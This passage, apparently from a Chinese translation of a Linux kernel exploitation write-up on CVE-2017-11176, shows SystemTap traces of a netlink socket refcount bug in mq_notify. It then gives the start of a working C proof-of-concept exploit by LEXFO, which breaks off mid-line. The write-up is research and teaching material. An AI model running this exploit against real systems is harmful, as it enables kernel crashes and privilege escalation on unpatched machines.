copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; netlink_attachskb (sk=0xffff880037218000 skb=0xffff88003d96c500 timeo=0xffff88003d8cfbd8 ssk=0xffff880037218800)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c5d8ca0)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c884340)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; netlink_attachskb = fffffffffffffff5</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0x0)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff880037218800)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1371) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1371) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1371) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(1370-1370) &gt;&gt;&gt; mq_notify (4294967295, 0x7fffff6932f0)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; skb_put (skb=0xffff88003d96c500 len=0x20)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; skb_put = ffff88003c8b7400</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=0x4)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e601</span><br><span class="line">(1370-1370) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff880020c1e600)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; netlink_getsockbyfilp = ffff880037218000</span><br><span class="line">(1370-1370) &gt;&gt;&gt; netlink_attachskb (sk=0xffff880037218000 skb=0xffff88003d96c500 timeo=0xffff88003d8cff08 ssk=0x0)</span><br><span class="line">[unblock] closing 4 fd</span><br><span class="line">[unblock] unblocking now</span><br><span class="line">[+] mq_notify succeed</span><br><span class="line">[ ] creating unblock thread...</span><br><span class="line">[+] unblocking thread has been created!</span><br><span class="line">[ ] get ready to block</span><br><span class="line">(1370-1371) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1371) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1371) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1371) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1371) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(1370-1371) &lt;&lt;&lt; __fdget = ffff880020c1e601</span><br><span class="line">(1370-1370) &lt;&lt;&lt; netlink_attachskb = 1</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=0x4)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; __fdget = 0</span><br><span class="line">(1370-1370) &gt;&gt;&gt; netlink_detachskb (sk=0xffff880037218000 skb=0xffff88003d96c500)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c8b7400)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff880037218000 &#125;=-</span><br><span class="line">- sk = 0xffff880037218000</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 10816</span><br><span class="line">- sk-&gt;sk_rcvbuf = 2304</span><br><span class="line">- sk-&gt;sk_refcnt = 1</span><br><span class="line">- nlk-&gt;state = 0</span><br><span class="line">- sk-&gt;sk_flags = 100</span><br><span class="line">- SOCK_DEAD = 0</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">(1370-1370) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1372) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1372) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1372) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(1370-1370) &gt;&gt;&gt; mq_notify (4294967295, 0x7fffff6932f0)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; skb_put (skb=0xffff88003d96c500 len=0x20)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; skb_put = ffff88003c8b7400</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=0x5)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e601</span><br><span class="line">(1370-1370) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff880020c1e600)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; netlink_getsockbyfilp = ffff880037218000</span><br><span class="line">(1370-1370) &gt;&gt;&gt; netlink_attachskb (sk=0xffff880037218000 skb=0xffff88003d96c500 timeo=0xffff88003d8cff08 ssk=0x0)</span><br><span class="line">[unblock] closing 5 fd</span><br><span class="line">[unblock] unblocking now</span><br><span class="line">[+] mq_notify succeed</span><br><span class="line">[ ] ready to crash?</span><br><span class="line">[ ] press key to <span class="built_in">continue</span>...</span><br><span class="line">(1370-1372) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1372) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1372) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1372) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1372) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(1370-1372) &lt;&lt;&lt; __fdget = ffff880020c1e601</span><br><span class="line">(1370-1370) &lt;&lt;&lt; netlink_attachskb = 1</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=0x5)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; __fdget = 0</span><br><span class="line">(1370-1370) &gt;&gt;&gt; netlink_detachskb (sk=0xffff880037218000 skb=0xffff88003d96c500)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c8b7400)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c5d8c40)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c884dc0)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff880037218000)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff880037218000 &#125;=-</span><br><span class="line">- sk = 0xffff880037218000</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 2304</span><br><span class="line">- sk-&gt;sk_refcnt = 0</span><br><span class="line">- nlk-&gt;state = 0</span><br><span class="line">- sk-&gt;sk_flags = 100</span><br><span class="line">- SOCK_DEAD = 0</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">(1370-1370) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br></pre></td></tr></table></figure>

<h3 id="Final-Proof-Of-Concept-Code"><a href="#Final-Proof-Of-Concept-Code" class="headerlink" title="Final Proof-Of-Concept Code"></a>Final Proof-Of-Concept Code</h3><p>在最后三节中，我们仅使用<em>用户态代码</em>实现触发该错误所需的所有条件。在最终的<em>proof-of-concept</em>之前，还需要做一件事。</p>
<p>在尝试填充接收缓冲区时，我们发现由于netlink_insert()，在netlink_bind()期间，refcounter加一。 这意味着在进入<em>mq_notify()之前</em>，refcounter被设置为2（而不是1）。</p>
<p>由于该错误使netlink_sock refcounter减少了1，因此我们需要<strong>两次触发该错误</strong>。</p>
<p>在触发错误之前，我们使用了*dup()*来解除阻塞主线程的方法。我们将需要再次使用它（因为旧的已关闭），因此我们可以保留一个fd来unblock，而保留另一个fd来触发该错误。</p>
<p>最终的PoC，不需要运行System Tap：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * CVE-2017-11176 Proof-of-concept code by LEXFO.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Compile with:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  gcc -fpic -O0 -std=c99 -Wall -pthread exploit.c -o exploit</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mqueue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTIFY_COOKIE_LEN (32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOL_NETLINK (270) <span class="comment">// from [include/linux/socket.h]</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// avoid library wrappers</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _setsockopt(sockfd, level, optname, optval, optlen) \</span></span><br><span class="line">  syscall(__NR_setsockopt, sockfd, level, optname, optval, optlen)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _getsockopt(sockfd, level, optname, optval, optlen) \</span></span><br><span class="line">  syscall(__NR_getsockopt, sockfd, level, optname, optval, optlen)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _dup(oldfd) syscall(__NR_dup, oldfd)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _close(fd) syscall(__NR_close, fd)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _sendmsg(sockfd, msg, flags) syscall(__NR_sendmsg, sockfd, msg, flags)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _bind(sockfd, addr, addrlen) syscall(__NR_bind, sockfd, addr, addrlen)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRESS_KEY() \</span></span><br><span class="line">  <span class="keyword">do</span> &#123; <span class="built_in">printf</span>(<span class="string">&quot;[ ] press key to continue...\n&quot;</span>); getchar(); &#125; <span class="keyword">while</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">unblock_thread_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">int</span> sock_fd;</span><br><span class="line">  <span class="keyword">int</span> unblock_fd;</span><br><span class="line">  <span class="keyword">bool</span> is_ready; <span class="comment">// we can use pthread barrier instead</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">unblock_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">unblock_thread_arg</span> *<span class="title">uta</span> = (<span class="title">struct</span> <span class="title">unblock_thread_arg</span>*) <span class="title">arg</span>;</span></span><br><span class="line">  <span class="keyword">int</span> val = <span class="number">3535</span>; <span class="comment">// need to be different than zero</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// notify the main thread that the unblock thread has been created. It *must*</span></span><br><span class="line">  <span class="comment">// directly call mq_notify().</span></span><br><span class="line">  uta-&gt;is_ready = <span class="literal">true</span>; </span><br><span class="line"></span><br><span class="line">  sleep(<span class="number">5</span>); <span class="comment">// gives some time for the main thread to block</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ][unblock] closing %d fd\n&quot;</span>, uta-&gt;sock_fd);</span><br><span class="line">  _close(uta-&gt;sock_fd);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ][unblock] unblocking now\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (_setsockopt(uta-&gt;unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &amp;val, <span class="keyword">sizeof</span>(val)))</span><br><span class="line">    perror(<span class="string">&quot;[+] setsockopt&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">decrease_sock_refcounter</span><span class="params">(<span class="keyword">int</span> sock_fd, <span class="keyword">int</span> unblock_fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pthread_t</span> tid;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> <span class="title">sigev</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">unblock_thread_arg</span> <span class="title">uta</span>;</span></span><br><span class="line">  <span class="keyword">char</span> sival_buffer[NOTIFY_COOKIE_LEN];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// initialize the unblock thread arguments</span></span><br><span class="line">  uta.sock_fd = sock_fd;</span><br><span class="line">  uta.unblock_fd = unblock_fd;</span><br><span class="line">  uta.is_ready = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// initialize the sigevent structure</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;sigev, <span class="number">0</span>, <span class="keyword">sizeof</span>(sigev));</span><br><span class="line">  sigev.sigev_notify = SIGEV_THREAD;</span><br><span class="line">  sigev.sigev_value.sival_ptr = sival_buffer;</span><br><span class="line">  sigev.sigev_signo = uta.sock_fd;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ] creating unblock thread...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((errno = pthread_create(&amp;tid, <span class="literal">NULL</span>, unblock_thread, &amp;uta)) != <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (uta.is_ready == <span class="literal">false</span>) <span class="comment">// spinlock until thread is created</span></span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] unblocking thread has been created!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ] get ready to block\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((_mq_notify((<span class="keyword">mqd_t</span>)<span class="number">-1</span>, &amp;sigev) != <span class="number">-1</span>) || (errno != EBADF))</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] mq_notify&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] mq_notify succeed\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Creates a netlink socket and fills its receive buffer.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns the socket file descriptor or -1 on error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">prepare_blocking_socket</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> send_fd;</span><br><span class="line">  <span class="keyword">int</span> recv_fd;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">1024</span>*<span class="number">10</span>];</span><br><span class="line">  <span class="keyword">int</span> new_size = <span class="number">0</span>; <span class="comment">// this will be reset to SOCK_MIN_RCVBUF</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">addr</span> = &#123;</span></span><br><span class="line">    .nl_family = AF_NETLINK,</span><br><span class="line">    .nl_pad = <span class="number">0</span>,</span><br><span class="line">    .nl_pid = <span class="number">118</span>, <span class="comment">// must different than zero</span></span><br><span class="line">    .nl_groups = <span class="number">0</span> <span class="comment">// no groups</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> = &#123;</span></span><br><span class="line">    .iov_base = buf,</span><br><span class="line">    .iov_len = <span class="keyword">sizeof</span>(buf)</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">mhdr</span> = &#123;</span></span><br><span class="line">    .msg_name = &amp;addr,</span><br><span class="line">    .msg_namelen = <span class="keyword">sizeof</span>(addr),</span><br><span class="line">    .msg_iov = &amp;iov,</span><br><span class="line">    .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    .msg_control = <span class="literal">NULL</span>,</span><br><span class="line">    .msg_controllen = <span class="number">0</span>,</span><br><span class="line">    .msg_flags = <span class="number">0</span>, </span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ] preparing blocking netlink socket\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((send_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) &lt; <span class="number">0</span> ||</span><br><span class="line">      (recv_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] socket created (send_fd = %d, recv_fd = %d)\n&quot;</span>, send_fd, recv_fd);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (_bind(recv_fd, (struct sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (errno != EADDRINUSE)</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] bind&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> fail;</span><br><span class="line">    &#125;</span><br><span class="line">    addr.nl_pid++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] netlink socket bound (nl_pid=%d)\n&quot;</span>, addr.nl_pid);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &amp;new_size, <span 